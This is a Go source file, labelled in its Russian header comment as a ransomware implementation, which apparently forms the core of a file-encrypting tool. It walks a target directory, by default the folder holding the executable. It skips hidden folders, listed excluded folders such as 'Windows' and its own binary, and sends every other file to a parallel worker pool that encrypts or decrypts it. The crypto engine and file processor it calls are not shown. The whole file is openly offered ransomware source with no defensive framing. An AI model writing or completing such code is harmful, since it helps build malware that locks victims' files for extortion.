/*
Реализация шифровальщика (ransomware)
*/
package ransom

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

// Mode определяет режим работы утилиты
type Mode string

const (
	ModeEncrypt Mode = "encrypt"
	ModeDecrypt Mode = "decrypt"

	DefaultExcludes = "Windows"
)

type Ransom struct {
	targetDir string
	stop      context.CancelFunc
	jobs      chan string

	cr *CryptoEngine
	fp *FileProcessor
}

// Целевая папка, ключ, исключаемые папки (папка,папка)
func NewRansom(targetDir, key, excludes string) (*Ransom, error) {
	if targetDir == "" {
		exePath, err := os.Executable()
		if err != nil {
			return nil, ErrExecutableNotFound
		}
		targetDir = filepath.Dir(exePath)
	}

	excl := parseExcludes(excludes)

	crypto := NewCryptoEngine(key)
	processor, err := NewFileProcessor(crypto, excl)
	if err != nil {
		return nil, fmt.Errorf("NewFileProcessor: %w", err)
	}

	r := &Ransom{
		cr:        crypto,
		fp:        processor,
		targetDir: targetDir,
		stop:      nil,
		jobs:      make(chan string, 100),
	}

	return r, nil
}

func (r *Ransom) Encrypt() error {
	ctx, stop := context.WithCancel(context.Background())
	r.stop = stop
	defer r.Stop()

	return r.process(ctx, ModeEncrypt)
}

func (r *Ransom) Decrypt() error {
	ctx, stop := context.WithCancel(context.Background())
	r.stop = stop
	defer r.Stop()

	return r.process(ctx, ModeDecrypt)
}

func (r *Ransom) process(ctx context.Context, mode Mode) error {
	var wg sync.WaitGroup

	// Канал для сбора ошибок из продюсера
	errChan := make(chan error, 1)

	// Запуск пула воркеров
	numWorkers := runtime.NumCPU()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case path, ok := <-r.jobs:
					if !ok {
						return
					}
					r.fp.ProcessFile(path, mode)
				}
			}
		}()
	}

	// Передаем errChan в продюсер
	go r.producer(ctx, errChan)

	// Ждем, пока воркеров разберет оставшиеся задачи (даже если продюсер упал, канал r.jobs закроется)
	wg.Wait()

	// Проверяем, была ли ошибка в продюсере
	select {
	case err := <-errChan:
		if err != nil {
			return fmt.Errorf("producer error: %w", err)
		}
	default:
	}

	return ctx.Err()
}

func (r *Ransom) producer(ctx context.Context, errChan chan<- error) {
	defer close(r.jobs)

	err := filepath.WalkDir(r.targetDir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}

		if ctx.Err() != nil {
			return ctx.Err()
		}

		if d.IsDir() {
			if strings.HasPrefix(d.Name(), ".") {
				return filepath.SkipDir
			}

			if _, excluded := r.fp.excludeDirs[d.Name()]; excluded {
				return filepath.SkipDir
			}
			return nil
		}

		absPath, err := filepath.Abs(path)
		if err == nil && absPath == r.fp.selfPath {
			return nil
		}

		select {
		case <-ctx.Done():
			return ctx.Err()
		case r.jobs <- path:
		}

		return nil
	})

	// Вот здесь мы перехватываем ошибку на 150-й строчке и отправляем её наверх
	if err != nil && !errors.Is(err, context.Canceled) {
		errChan <- err
	}
}

func (r *Ransom) Stop() {
	if r.stop != nil {
		r.stop()

		r.stop = nil
	}
}

func parseExcludes(excludes string) []string {
	var result []string
	if excludes != "" {
		// Минимальный парсинг разделителей
		result = filepath.SplitList(excludes)
		if len(result) == 1 {
			// На случай если передали через обычную запятую на Windows/Linux
			result = strings.Split(excludes, ",")
		}
	}
	return result
}
